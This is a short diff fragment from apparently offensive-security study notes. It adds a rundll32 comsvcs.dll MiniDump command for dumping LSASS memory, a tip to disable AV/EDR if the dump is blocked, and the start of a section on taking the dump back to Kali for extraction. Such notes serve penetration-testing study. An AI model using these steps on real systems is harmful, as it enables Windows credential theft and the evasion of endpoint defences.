@@ -64,5 +64,10 @@ If only command line access is available, we can then dump with the help of rund
 (CMD>tasklist /svc #Locate lsass.exe and note its PID
 #or
 (PS)Get-Process lsass # Note its Id
-
+rundll32 C:\windows\system32\comsvcs.dll, MiniDump <lsassPID> <abspath_desired> full
+#Note: If blocked, try disable AV / EDR
 ```
+
+-Extracting information from Kali
+
+If we are able to transfer the file back to kali
